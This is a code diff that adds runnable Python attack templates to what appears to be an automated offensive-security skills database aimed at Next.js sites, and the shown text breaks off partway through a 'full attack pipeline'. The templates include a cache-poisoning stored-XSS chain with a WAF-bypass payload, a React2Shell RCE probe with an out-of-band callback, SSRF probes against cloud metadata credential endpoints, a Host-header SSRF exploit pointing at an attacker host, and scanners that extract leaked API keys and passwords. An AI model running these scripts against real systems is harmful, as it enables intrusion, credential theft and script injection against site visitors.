@@ -55,6 +55,59 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "recon",
         "severity": "info",
         "auto_trigger": ["nextjs", "next.js", "react", "rsc", "_next/", "app router"],
+        "code_template": r'''import requests, re, json, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] Next.js RSC Fingerprinter — {{TARGET}}")
+print("=" * 60)
+
+# Step 1: Basic fetch
+resp = session.get(TARGET, headers=H, timeout=15)
+is_nextjs = "_next/" in resp.text or "x-nextjs" in str(resp.headers).lower()
+is_app_router = "__NEXT_DATA__" not in resp.text and "_next/static" in resp.text
+is_pages_router = "__NEXT_DATA__" in resp.text
+
+# Check response headers
+print(f"[+] Status: {{resp.status_code}} | Size: {{len(resp.text)}} bytes")
+print(f"[+] Framework: {{'Next.js' if is_nextjs else 'Unknown'}}")
+print(f"[+] Router: {{'App Router (RSC)' if is_app_router else 'Pages Router' if is_pages_router else 'Unknown'}}")
+
+for h in ["x-nextjs-prerender", "x-powered-by", "server", "x-vercel-id"]:
+    if h in resp.headers:
+        print(f"[+] {h}: {{resp.headers[h]}}")
+
+# Step 2: Test RSC header reflection (key indicator for CVE-2025-55182)
+rsc_resp = session.get(TARGET, headers={{**H, "Rsc": "1"}}, timeout=15)
+is_rsc_content = "text/x-component" in rsc_resp.headers.get("content-type", "")
+print(f"\n[+] RSC endpoint test (Rsc: 1 header): {{rsc_resp.status_code}}")
+print(f"    Content-Type: {{rsc_resp.headers.get('content-type', 'N/A')}}")
+if is_rsc_content:
+    print(f"    [!] App Router CONFIRMED — RSC payload returned")
+    print(f"    [!] Potential React2Shell (CVE-2025-55182) target!")
+
+# Step 3: Check Next.js version from _next/static
+ver_paths = ["/_next/static/chunks/framework.js", "/_next/static/chunks/main.js"]
+for vp in ver_paths:
+    r = session.get(f"{{TARGET}}{{vp}}", headers=H, timeout=10)
+    if r.status_code == 200:
+        ver_match = re.search(r'next["\s]+version["\s]*[:=]["\s]*([\d.]+)', r.text, re.IGNORECASE)
+        if ver_match:
+            print(f"\n[+] Next.js version detected: {{ver_match.group(1)}}")
+
+# Step 4: Check if Server Actions are enabled
+action_resp = session.post(TARGET, headers={{**H, "Next-Action": "test"}}, timeout=10)
+if action_resp.status_code != 404:
+    print(f"\n[+] Next-Action header accepted: {{action_resp.status_code}} — Server Actions enabled!")
+
+print(f"\n[SUMMARY]")
+print(f"  App Router (RSC): {{'YES — likely vulnerable to CVE-2025-55182' if is_rsc_content else 'NOT DETECTED'}}")
+print(f"  Pages Router: {{'YES' if is_pages_router else 'NO'}}")
+''',
     },
 
     # ── 2. 0-click SXSS via RSC + Cache Poisoning ──────────────────────────────
@@ -91,6 +144,90 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "exploit",
         "severity": "critical",
         "auto_trigger": ["rsc sxss", "cache poison nextjs", "0-click xss nextjs", "nextjs sxss"],
+        "code_template": r'''import requests, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+
+print(f"[*] Next.js 0-click SXSS via RSC Cache Poisoning — {{TARGET}}")
+print("=" * 70)
+
+BASE_H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+# ── Step 1: Check if RSC headers are reflected in response ────────────────────
+print("[Phase 1] Testing header reflection...")
+test_h = {{**BASE_H, "Rsc": "1", "X-Test-Reflect": "bingo-probe-12345"}}
+r = session.get(TARGET, headers=test_h, timeout=15)
+header_reflected = "bingo-probe-12345" in str(r.headers) or "bingo-probe-12345" in r.text
+content_type_reflected = "text/x-component" in r.headers.get("content-type", "")
+
+print(f"  Response CT: {{r.headers.get('content-type', 'N/A')}}")
+print(f"  RSC response: {{'YES' if content_type_reflected else 'NO'}}")
+print(f"  Header reflected: {{'YES' if header_reflected else 'NO — required for this attack'}}")
+
+# ── Step 2: Test Content-Type override ───────────────────────────────────────
+print("\n[Phase 2] Testing Content-Type override...")
+ct_override_h = {{**BASE_H, "Rsc": "1", "Content-Type": "text/html"}}
+r2 = session.get(TARGET, headers=ct_override_h, timeout=15)
+ct_override_works = "text/html" in r2.headers.get("content-type", "")
+
+print(f"  Response CT after override: {{r2.headers.get('content-type', 'N/A')}}")
+print(f"  Override successful: {{'YES — VULNERABLE' if ct_override_works else 'NO'}}")
+
+# ── Step 3: Test URL param reflection in RSC payload ────────────────────────
+print("\n[Phase 3] Testing URL param reflection in RSC payload...")
+PROBE = "bingo_reflect_test_9876"
+probe_h = {{**BASE_H, "Rsc": "1"}}
+r3 = session.get(f"{{TARGET}}?testparam={{PROBE}}", headers=probe_h, timeout=15)
+param_reflected = PROBE in r3.text
+print(f"  Param reflected in RSC payload: {{'YES — VULNERABLE' if param_reflected else 'NO'}}")
+
+# ── Step 4: Build SXSS payload if conditions met ────────────────────────────
+if ct_override_works and param_reflected:
+    print("\n[Phase 4] Building SXSS payload...")
+    # XSS payload that works inside RSC text/html context
+    XSS = "<img src=x onerror=alert(document.domain)>"
+    # WAF bypass variant
+    XSS_ENCODED = "<img src=x onerror=b=%270)%27;a=%27javascript%27%2B%27:%27%2B%27alert%27%2B%27(%27;frames[%27loca%27%2B%27tion%27]=a%2Bb>"
+    
+    # Stage 1: Poison target path with XSS
+    stage1_url = f"{{TARGET}}?pwn={{XSS_ENCODED}}"
+    stage1_h = {{**BASE_H, "Rsc": "1", "Content-Type": "text/html"}}
+    r_s1 = session.get(stage1_url, headers=stage1_h, timeout=15)
+    print(f"\n  [Stage 1] Poison target path:")
+    print(f"    URL: {{stage1_url[:100]}}")
+    print(f"    Response: {{r_s1.status_code}} | CT: {{r_s1.headers.get('content-type','N/A')}}")
+    print(f"    Payload in response: {{'YES' if 'img src' in r_s1.text or 'onerror' in r_s1.text else 'NO'}}")
+    
+    # Stage 2: Poison home page with Refresh redirect
+    print(f"\n  [Stage 2] Poison home page with Refresh header:")
+    stage2_h = {{**BASE_H, "Refresh": f"0; {{stage1_url}}"}}
+    r_s2 = session.get(TARGET, headers=stage2_h, timeout=15)
+    print(f"    Response: {{r_s2.status_code}}")
+    refresh_in_resp = "Refresh" in r_s2.headers
+    print(f"    Refresh header in response: {{'YES — 0-click chain complete!' if refresh_in_resp else 'NO'}}")
+    
+    print(f"\n[!] VULNERABILITY CONFIRMED")
+    print(f"    Attack: 0-click SXSS via RSC Cache Poisoning")
+    print(f"    Vector: Header reflection + Content-Type confusion + CDN cache")
+    print(f"    Impact: Stored XSS served to ANY user visiting {{TARGET}}")
+    print(f"\n    Manual PoC Request 1 (poison target page):")
+    print(f"    GET {{TARGET}}?pwn={{XSS[:50]}} HTTP/1.1")
+    print(f"    Rsc: 1")
+    print(f"    Content-Type: text/html")
+    print(f"\n    Manual PoC Request 2 (poison home page for 0-click):")
+    print(f"    GET {{TARGET}}/ HTTP/1.1")
+    print(f"    Refresh: 0; {{stage1_url[:80]}}")
+else:
+    print("\n[-] Conditions not met for this attack:")
+    if not ct_override_works:
+        print("    - Content-Type override not working (headers not reflected)")
+    if not param_reflected:
+        print("    - URL params not reflected in RSC payload")
+    print("    Try: check for CDN presence (Cloudflare cf-cache-status header)")
+''',
     },
 
     # ── 3. React2Shell CVE-2025-55182 ─────────────────────────────────────────
@@ -137,6 +274,129 @@ SKILLS_DB_14: dict[str, dict] = {
             "react2shell", "cve-2025-55182", "cve-2025-66478",
             "react server components", "rsc rce", "nextjs rce",
         ],
+        "code_template": r'''import requests, json, urllib3, time
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H_BASE = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] React2Shell Scanner — CVE-2025-55182 / CVE-2025-66478")
+print(f"[*] Target: {{TARGET}}")
+print("=" * 70)
+
+# ── Step 1: Fingerprint RSC ───────────────────────────────────────────────────
+print("[Phase 1] Checking RSC / App Router presence...")
+r = session.get(TARGET, headers={{**H_BASE, "Rsc": "1"}}, timeout=15)
+has_rsc = "text/x-component" in r.headers.get("content-type", "")
+print(f"  RSC (text/x-component): {{'YES' if has_rsc else 'NO'}}")
+if not has_rsc:
+    print("  [-] RSC not detected — target may not be using App Router")
+    print("      Continuing detection anyway...")
+
+# ── Step 2: Probe RSC endpoints ───────────────────────────────────────────────
+print("\n[Phase 2] Probing RSC endpoints for React2Shell signature...")
+
+RSC_ENDPOINTS = [
+    TARGET,
+    f"{{TARGET}}/api",
+    f"{{TARGET}}/api/action",
+    f"{{TARGET}}/api/server",
+]
+
+# Detection payload: malformed RSC Flight multipart body
+# Vulnerable hosts: HTTP 500 + E{"digest" in response body
+DETECTION_BOUNDARY = "bingo-react2shell-probe"
+DETECTION_BODY = (
+    f"--{{DETECTION_BOUNDARY}}\r\n"
+    f"Content-Disposition: form-data; name=\"0\"\r\n\r\n"
+    f"[\"$K1\"]\r\n"
+    f"--{{DETECTION_BOUNDARY}}--\r\n"
+)
+DETECTION_HEADERS = {{
+    **H_BASE,
+    "Content-Type": f"multipart/form-data; boundary={{DETECTION_BOUNDARY}}",
+    "Next-Action": "0" * 40,  # placeholder action hash
+}}
+
+vulnerable_endpoints = []
+for ep in RSC_ENDPOINTS:
+    try:
+        r = session.post(ep, data=DETECTION_BODY, headers=DETECTION_HEADERS, timeout=12)
+        status = r.status_code
+        body_snippet = r.text[:200]
+        
+        # Primary indicator: 500 + E{"digest" pattern
+        is_vuln_primary = (status == 500 and 'digest' in r.text.lower()
+                           and ('E{{' in r.text or '"digest"' in r.text))
+        # Secondary: 500 + error references RSC internals  
+        is_vuln_secondary = (status == 500 and any(
+            x in r.text for x in ["react-server", "flight", "RSC", "server components"]
+        ))
+        
+        marker = "[VULNERABLE]" if is_vuln_primary else ("[POSSIBLE]" if is_vuln_secondary else f"[{status}]")
+        print(f"  {{marker}} {{ep}}")
+        if status != 404:
+            print(f"    Status: {{status}} | Body: {{body_snippet[:100]}}")
+        
+        if is_vuln_primary or is_vuln_secondary:
+            vulnerable_endpoints.append(ep)
+    except Exception as e:
+        print(f"  [ERR] {{ep}}: {{str(e)[:50]}}")
+
+# ── Step 3: Check version via Next.js headers ─────────────────────────────────
+print("\n[Phase 3] Checking Next.js version...")
+ver_r = session.get(TARGET, headers=H_BASE, timeout=15)
+powered_by = ver_r.headers.get("x-powered-by", "")
+if "Next.js" in powered_by:
+    print(f"  Powered-By: {{powered_by}}")
+
+# Try to extract version from JS bundles
+import re
+js_paths = ["/_next/static/chunks/framework.js", "/_next/static/chunks/webpack.js"]
+for jp in js_paths:
+    jr = session.get(f"{{TARGET}}{{jp}}", headers=H_BASE, timeout=8)
+    if jr.status_code == 200:
+        vm = re.search(r'"next["\s]+[":][\s]*([\d.]+)', jr.text)
+        if vm:
+            version = vm.group(1)
+            print(f"  Next.js version: {{version}}")
+            vuln_ranges = ["15.", "16.", "14.3.0"]
+            is_likely_vuln = any(version.startswith(v) for v in vuln_ranges)
+            print(f"  Vulnerable version range: {{'LIKELY YES' if is_likely_vuln else 'check fixed versions'}}")
+            print(f"  Fixed versions: 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7")
+            break
+
+# ── Step 4: OAST probe (out-of-band detection) ───────────────────────────────
+print("\n[Phase 4] OAST/callback probe (requires interactsh)...")
+print("  Manual test: replace OAST_URL below with your interactsh URL")
+OAST_URL = "http://YOUR-INTERACTSH-URL.oast.fun"
+# The actual RCE payload format (conceptual — requires valid action hash):
+print(f"""  POST {{TARGET}} HTTP/1.1
+  Content-Type: multipart/form-data; boundary=----boundary
+  Next-Action: <valid-action-hash-from-js-bundle>
+  
+  ------boundary
+  Content-Disposition: form-data; name="1"
+  
+  ["$@{{OAST_URL}}"]
+  ------boundary--""")
+
+# ── Summary ───────────────────────────────────────────────────────────────────
+print("\n" + "=" * 70)
+print(f"[SUMMARY] CVE-2025-55182 / CVE-2025-66478 Assessment")
+print(f"  RSC App Router detected: {{'YES' if has_rsc else 'No/Unknown'}}")
+print(f"  Vulnerable endpoints found: {{len(vulnerable_endpoints)}}")
+if vulnerable_endpoints:
+    for ve in vulnerable_endpoints:
+        print(f"    → {{ve}}")
+    print(f"\n  [CRITICAL] Likely vulnerable to React2Shell RCE!")
+    print(f"  Patch: React 19.0.1/19.1.2/19.2.1, Next.js 15.0.5+/15.1.9+/16.0.7+")
+    print(f"  Immediate action: Upgrade to patched version NOW")
+else:
+    print(f"  No clear React2Shell signature — may be patched or Pages Router only")
+''',
     },
 
     # ── 4. __NEXT_DATA__ SSR Props Leak ───────────────────────────────────────
@@ -167,6 +427,81 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "recon",
         "severity": "high",
         "auto_trigger": ["__NEXT_DATA__", "getServerSideProps", "nextjs data leak", "ssr props"],
+        "code_template": r'''import requests, re, json, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] Next.js __NEXT_DATA__ SSR Props Scanner — {{TARGET}}")
+print("=" * 60)
+
+SECRET_PATTERNS = [
+    (r'(sk-[a-zA-Z0-9]{20,})', "OpenAI API Key"),
+    (r'(AKIA[A-Z0-9]{16})', "AWS Access Key"),
+    (r'(mongodb(?:\+srv)?://[^\s\'"]+)', "MongoDB URI"),
+    (r'(postgres(?:ql)?://[^\s\'"]+)', "PostgreSQL URI"),
+    (r'(mysql://[^\s\'"]+)', "MySQL URI"),
+    (r'"password"\s*:\s*"([^"]{4,})"', "Password"),
+    (r'"token"\s*:\s*"([^"]{16,})"', "Token"),
+    (r'"apiKey"\s*:\s*"([^"]{8,})"', "API Key"),
+    (r'"secret"\s*:\s*"([^"]{8,})"', "Secret"),
+    (r'"authToken"\s*:\s*"([^"]{16,})"', "Auth Token"),
+    (r'"privateKey"\s*:\s*"([^"]{20,})"', "Private Key"),
+    (r'"(https?://(?:internal|admin|api|backend|db|redis)[^\s\'"]{5,})"', "Internal URL"),
+]
+
+# Gather pages from HTML + common paths
+resp = session.get(TARGET, headers=H, timeout=15)
+links = re.findall(r'href=["\'](/[^"\'#\s?]{0,60})["\']', resp.text)
+paths = list(set(["/"] + [l for l in links if "." not in l.split("/")[-1]][:30]))
+paths += ["/dashboard", "/profile", "/admin", "/settings", "/user",
+          "/account", "/api/auth", "/login", "/register"]
+
+print(f"[+] Scanning {{len(paths)}} pages for __NEXT_DATA__...")
+found_data = []
+
+for path in paths:
+    url = f"{{TARGET}}{{path}}"
+    try:
+        r = session.get(url, headers=H, timeout=10)
+        if r.status_code == 200 and "__NEXT_DATA__" in r.text:
+            # Extract JSON
+            m = re.search(r'<script id="__NEXT_DATA__" type="application/json">(.*?)</script>',
+                          r.text, re.DOTALL)
+            if m:
+                raw = m.group(1).strip()
+                try:
+                    data = json.loads(raw)
+                    props = data.get("props", {}).get("pageProps", {})
+                    print(f"\n  [FOUND] {{url}}")
+                    print(f"    Props keys: {{list(props.keys())[:10]}}")
+                    
+                    # Scan for secrets
+                    flat = json.dumps(data)
+                    for pattern, label in SECRET_PATTERNS:
+                        for m2 in re.findall(pattern, flat, re.IGNORECASE):
+                            val = m2 if isinstance(m2, str) else m2[0] if m2 else ""
+                            if len(val) > 4:
+                                print(f"    [SECRET] {{label}}: {{val[:80]}}")
+                                found_data.append({{"path": path, "type": label, "value": val}})
+                    
+                    # Flag interesting keys
+                    flat_lower = flat.lower()
+                    sensitive_keys = ["user", "token", "auth", "session", "admin", "role", "email"]
+                    for sk in sensitive_keys:
+                        if f'"{sk}"' in flat_lower:
+                            idx = flat_lower.find(f'"{sk}"')
+                            print(f"    [DATA] Contains '{sk}': {{flat[idx:idx+60]}}")
+                except Exception:
+                    pass
+    except Exception:
+        pass
+
+print(f"\n[SUMMARY] {{len(found_data)}} secrets found in __NEXT_DATA__ props")
+''',
     },
 
     # ── 5. _next/image SSRF ────────────────────────────────────────────────────
@@ -198,6 +533,75 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "exploit",
         "severity": "high",
         "auto_trigger": ["_next/image", "nextjs ssrf", "image optimization ssrf"],
+        "code_template": r'''import requests, urllib.parse, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] Next.js _next/image SSRF Tester — {{TARGET}}")
+print("=" * 60)
+
+IMAGE_ENDPOINT = f"{{TARGET}}/_next/image"
+
+# Internal targets to probe via SSRF
+SSRF_TARGETS = [
+    "http://127.0.0.1/",
+    "http://localhost/",
+    "http://127.0.0.1:3000/",
+    "http://127.0.0.1:8080/",
+    "http://169.254.169.254/latest/meta-data/",                    # AWS
+    "http://169.254.170.23/v1/credentials",                        # App Runner
+    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    "http://metadata.google.internal/computeMetadata/v1/",         # GCP
+    "http://169.254.169.254/metadata/instance",                    # Azure
+]
+
+print("[+] Probing _next/image SSRF...")
+for internal_url in SSRF_TARGETS:
+    enc_url = urllib.parse.quote(internal_url, safe="")
+    probe = f"{{IMAGE_ENDPOINT}}?url={{enc_url}}&w=32&q=10"
+    try:
+        r = session.get(probe, headers=H, timeout=10, allow_redirects=False)
+        status = r.status_code
+        ct = r.headers.get("content-type", "")
+        size = len(r.content)
+        
+        if status == 200:
+            print(f"  [FETCH SUCCESS] {{internal_url}}")
+            print(f"    Status: {{status}} | CT: {{ct}} | Size: {{size}} bytes")
+            if size > 100:
+                print(f"    Content preview: {{r.text[:200]}}")
+        elif status in (400, 500) and size > 0:
+            # May indicate the URL was processed but rejected
+            if any(x in r.text for x in ["hostname", "remotePattern", "not allowed"]):
+                print(f"  [BLOCKED] {{internal_url}} — remotePatterns blocking (restricted)")
+            else:
+                print(f"  [{{status}}] {{internal_url}} — {{r.text[:80]}}")
+    except Exception as e:
+        pass
+
+# Check if wildcard is allowed
+print("\n[+] Testing for wildcard remotePatterns...")
+external_probe = "http://httpbin.org/get"
+enc = urllib.parse.quote(external_probe, safe="")
+r2 = session.get(f"{{IMAGE_ENDPOINT}}?url={{enc}}&w=32&q=10", headers=H, timeout=12)
+if r2.status_code == 200:
+    print(f"  [WILDCARD] External URL fetched! remotePatterns may allow * hostname")
+    print(f"  [!] Full SSRF to any URL confirmed!")
+else:
+    print(f"  External URL blocked ({{r2.status_code}}) — remotePatterns likely restricted")
+
+# dangerouslyAllowSVG test
+print("\n[+] Testing dangerouslyAllowSVG (XSS via malicious SVG)...")
+# If you control an SVG with <script>, this can lead to XSS
+SVG_PAYLOAD = "https://YOUR-SERVER/malicious.svg"
+print(f"  Set up: host an SVG with <script>alert(1)</script> at {{SVG_PAYLOAD}}")
+print(f"  Then test: {{IMAGE_ENDPOINT}}?url={{urllib.parse.quote(SVG_PAYLOAD)}}&w=32&q=10")
+print(f"  If returned with content-type: image/svg+xml → XSS possible!")
+''',
     },
 
     # ── 6. Next-Action Header Enumeration & Replay ────────────────────────────
@@ -229,6 +633,83 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "recon",
         "severity": "high",
         "auto_trigger": ["next-action", "server action", "nextjs action", "use server"],
+        "code_template": r'''import requests, re, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] Next.js Server Action Enumerator — {{TARGET}}")
+print("=" * 60)
+
+# ── Step 1: Fetch main page and collect JS chunk URLs ─────────────────────────
+resp = session.get(TARGET, headers=H, timeout=15)
+js_chunks = re.findall(r'/_next/static/(?:chunks/)?[\w\-./]+\.js', resp.text)
+js_chunks = list(set(js_chunks))
+print(f"[+] Found {{len(js_chunks)}} JS chunks")
+
+# ── Step 2: Scan JS bundles for Next-Action hashes ────────────────────────────
+# Action hashes are 40-char hex strings associated with server functions
+ACTION_PATTERN = r'["\']([0-9a-f]{40})["\']'
+FUNCTION_PATTERN = r'["\'](use server)["\']'
+
+found_actions = set()
+print(f"[+] Scanning for Next-Action hashes (40-char hex)...")
+for chunk in js_chunks[:50]:
+    url = f"{{TARGET}}{{chunk}}" if chunk.startswith("/") else f"{{TARGET}}/_next/static/chunks/{{chunk}}"
+    try:
+        r = session.get(url, headers=H, timeout=10)
+        if r.status_code == 200:
+            hashes = re.findall(ACTION_PATTERN, r.text)
+            has_use_server = bool(re.search(FUNCTION_PATTERN, r.text))
+            for h in hashes:
+                if h not in found_actions:
+                    found_actions.add(h)
+                    if has_use_server:
+                        print(f"  [ACTION HASH] {{h}} (in chunk with 'use server')")
+    except Exception:
+        pass
+
+print(f"\n[+] Found {{len(found_actions)}} potential action hashes")
+
+# ── Step 3: Replay actions with test payloads ─────────────────────────────────
+print(f"\n[+] Replaying actions to test for vulnerabilities...")
+
+TEST_PAYLOADS = [
+    # FormData style
+    {{"data": "test=1&admin=true", "ct": "application/x-www-form-urlencoded"}},
+    # JSON style  
+    {{"data": '["admin@test.com","password123"]', "ct": "application/json"}},
+    # SSRF payload
+    {{"data": f'["http://169.254.169.254/latest/meta-data/"]', "ct": "application/json"}},
+]
+
+vulnerable_actions = []
+for action_hash in list(found_actions)[:10]:
+    for payload in TEST_PAYLOADS[:1]:  # Use first payload for initial probe
+        try:
+            r = session.post(TARGET, data=payload["data"],
+                           headers={{**H,
+                                    "Next-Action": action_hash,
+                                    "Content-Type": payload["ct"]}},
+                           timeout=10)
+            if r.status_code not in (404, 405):
+                print(f"  [ACTIVE] {{action_hash[:16]}}... → {{r.status_code}} ({{len(r.text)}} bytes)")
+                if r.status_code == 200:
+                    print(f"    Response: {{r.text[:150]}}")
+                    vulnerable_actions.append(action_hash)
+        except Exception:
+            pass
+
+print(f"\n[SUMMARY] Server Action Assessment:")
+print(f"  Action hashes found: {{len(found_actions)}}")
+print(f"  Active (non-404) actions: {{len(vulnerable_actions)}}")
+if vulnerable_actions:
+    print(f"  [!] Active server actions may expose server-side logic")
+    print(f"      Test for: IDOR, auth bypass, SSRF via action parameters")
+''',
     },
 
     # ── 7. CVE-2024-34351 Host Header SSRF ────────────────────────────────────
@@ -263,6 +744,65 @@ SKILLS_DB_14: dict[str, dict] = {
         "phase": "exploit",
         "severity": "high",
         "auto_trigger": ["cve-2024-34351", "host header ssrf nextjs", "nextjs blind ssrf"],
+        "code_template": r'''import requests, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H_BASE = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print(f"[*] Next.js CVE-2024-34351 — Host Header SSRF")
+print(f"[*] Target: {{TARGET}}")
+print("=" * 60)
+
+# Step 1: Check if any Server Actions exist
+print("[Phase 1] Checking for Server Actions...")
+r = session.get(TARGET, headers=H_BASE, timeout=15)
+import re
+action_hashes = re.findall(r'["\']([0-9a-f]{40})["\']', r.text)
+has_actions = bool(action_hashes)
+print(f"  Server Actions detected: {{'YES' if has_actions else 'NO (may still exist in JS chunks)'}}")
+
+# Step 2: Test Host header SSRF (requires interactsh or similar)
+print("\n[Phase 2] CVE-2024-34351 Host Header SSRF test...")
+print("  This exploit requires an external callback server (interactsh/ngrok).")
+print("  Replace ATTACKER_HOST below with your interactsh URL.\n")
+
+ATTACKER_HOST = "YOUR-INTERACTSH-URL.oast.fun"
+
+# The exploit: send POST with Next-Action header but spoof Host
+EXPLOIT_HEADERS = {{
+    **H_BASE,
+    "Host": ATTACKER_HOST,             # This is what causes the SSRF
+    "Next-Action": (action_hashes[0] if action_hashes else "a" * 40),
+    "Content-Type": "application/x-www-form-urlencoded",
+}}
+
+try:
+    r = session.post(TARGET, headers=EXPLOIT_HEADERS,
+                    data="test=ssrf", timeout=10)
+    print(f"  Response: {{r.status_code}} | Size: {{len(r.text)}} bytes")
+    if r.status_code in (307, 308):
+        loc = r.headers.get("location", "")
+        print(f"  Location: {{loc}}")
+        if ATTACKER_HOST in loc:
+            print(f"  [SSRF CONFIRMED] Server redirected to attacker host!")
+except requests.exceptions.ConnectionError:
+    print(f"  Connection error (expected if Host was spoofed to non-existent host)")
+    print(f"  [+] If your interactsh received an HTTP request — CVE-2024-34351 CONFIRMED!")
+
+print(f"\n  Manual PoC:")
+print(f"  POST {{TARGET}} HTTP/1.1")
+print(f"  Host: {{ATTACKER_HOST}}")
+print(f"  Next-Action: {action_hashes[0] if action_hashes else '<40-char-hex-action-hash>'}")
+print(f"  Content-Type: application/x-www-form-urlencoded")
+print(f"\n  Your interactsh should receive a HEAD request from the Next.js server.")
+print(f"  For full-read SSRF: respond with 200 + Content-Type: text/x-component")
+print(f"  Then the server will make a GET to your host and render the response.")
+print(f"\n  Affected versions: Next.js < 14.1.1")
+print(f"  Fixed in: Next.js 14.1.1+")
+''',
     },
 
     # ── 8. Full Next.js Pipeline ───────────────────────────────────────────────
@@ -303,6 +843,133 @@ SKILLS_DB_14: dict[str, dict] = {
             "next.js", "nextjs", "_next/", "_next/static", "next-action",
             "__next_data__", "create-next-app", "react server",
         ],
+        "code_template": r'''import requests, re, json, urllib3
+urllib3.disable_warnings()
+
+TARGET = "{target}"
+session = requests.Session()
+session.verify = False
+H = {{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}}
+
+print("=" * 70)
+print(f"[*] Next.js Full Attack Pipeline — {{TARGET}}")
+print("=" * 70)
+
+results = {{"rsc": False, "react2shell": False, "sxss": False,
+           "data_leak": [], "ssrf": False, "actions": []}}
+
+# ── Phase 1: Fingerprint ──────────────────────────────────────────────────────
+print("\n[Phase 1] Fingerprinting...")
+resp = session.get(TARGET, headers=H, timeout=15)
+is_nextjs = "_next/" in resp.text
+has_next_data = "__NEXT_DATA__" in resp.text
+has_rsc_path  = "/_next/static" in resp.text
+
+rsc_resp = session.get(TARGET, headers={{**H, "Rsc": "1"}}, timeout=15)
+results["rsc"] = "text/x-component" in rsc_resp.headers.get("content-type", "")
+
+print(f"  Next.js:     {{'YES' if is_nextjs else 'Unknown'}}")
+print(f"  App Router:  {{'YES (RSC active)' if results['rsc'] else 'No/Unknown'}}")
+print(f"  Pages Router:{{'YES (__NEXT_DATA__ found)' if has_next_data else 'No'}}")
+
+# ── Phase 2: React2Shell (CVE-2025-55182) ─────────────────────────────────────
+print("\n[Phase 2] React2Shell CVE-2025-55182 detection...")
+if results["rsc"]:
+    BOUNDARY = "bingo-r2s-scan"
+    BODY = (f"--{{BOUNDARY}}\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n"
+            f"[\"$K1\"]\r\n--{{BOUNDARY}}--\r\n")
+    r2s = session.post(TARGET, data=BODY, headers={{
+        **H,
+        "Content-Type": f"multipart/form-data; boundary={{BOUNDARY}}",
+        "Next-Action": "0" * 40,
+    }}, timeout=12)
+    results["react2shell"] = (r2s.status_code == 500 and "digest" in r2s.text.lower())
+    status_txt = "VULNERABLE" if results["react2shell"] else f"{{r2s.status_code}}"
+    print(f"  React2Shell scan: [{status_txt}]")
+    if results["react2shell"]:
+        print(f"  [CRITICAL] CVE-2025-55182 detected!")
+        print(f"  Fix: Upgrade to React 19.0.1/19.1.2/19.2.1 or Next.js 15.0.5+/16.0.7+")
+else:
+    print(f"  Skipped — App Router (RSC) not detected")
+
+# ── Phase 3: RSC SXSS Probe ───────────────────────────────────────────────────
+print("\n[Phase 3] RSC Content-Type confusion / SXSS probe...")
+if results["rsc"]:
+    ct_r = session.get(TARGET, headers={{**H, "Rsc": "1", "Content-Type": "text/html"}},
+                       timeout=10)
+    ct_overridden = "text/html" in ct_r.headers.get("content-type", "")
+    
+    probe_r = session.get(f"{{TARGET}}?bingo_probe=REFLECT123",
+                          headers={{**H, "Rsc": "1"}}, timeout=10)
+    param_reflected = "REFLECT123" in probe_r.text
+    
+    results["sxss"] = ct_overridden and param_reflected
+    print(f"  Content-Type override: {{'YES' if ct_overridden else 'NO'}}")
+    print(f"  Param reflected in RSC: {{'YES' if param_reflected else 'NO'}}")
+    if results["sxss"]:
+        print(f"  [SXSS POSSIBLE] 0-click cache poisoning chain conditions met!")
+        print(f"  See: nextjs-rsc-sxss skill for full PoC")
+
+# ── Phase 4: __NEXT_DATA__ leakage ───────────────────────────────────────────
+print("\n[Phase 4] __NEXT_DATA__ SSR props leakage...")
+if has_next_data:
+    m = re.search(r'<script id="__NEXT_DATA__"[^>]*>(.*?)</script>', resp.text, re.DOTALL)
+    if m:
+        try:
+            data = json.loads(m.group(1))
+            flat = json.dumps(data)
+            SECRET_PATS = [
+                (r'(sk-[a-zA-Z0-9]{20,})', "OpenAI Key"),
+                (r'(AKIA[A-Z0-9]{16})', "AWS Key"),
+                (r'(mongodb://[^\s\'"]{10,})', "MongoDB URI"),
+                (r'"password"\s*:\s*"([^"]{4,})"', "Password"),
+                (r'"token"\s*:\s*"([^"]{16,})"', "Token"),
+            ]
+            for pat, label in SECRET_PATS:
+                for hit in re.findall(pat, flat)[:2]:
+                    print(f"  [SECRET] {{label}}: {{str(hit)[:60]}}")
+                    results["data_leak"].append({{"type": label, "value": str(hit)[:60]}})
+            if not results["data_leak"]:
+                print(f"  Props keys: {{list(data.get('props',{{}}).get('pageProps',{{}}).keys())[:8]}}")
+        except Exception:
+            pass
+
+# ── Phase 5: _next/image SSRF ─────────────────────────────────────────────────
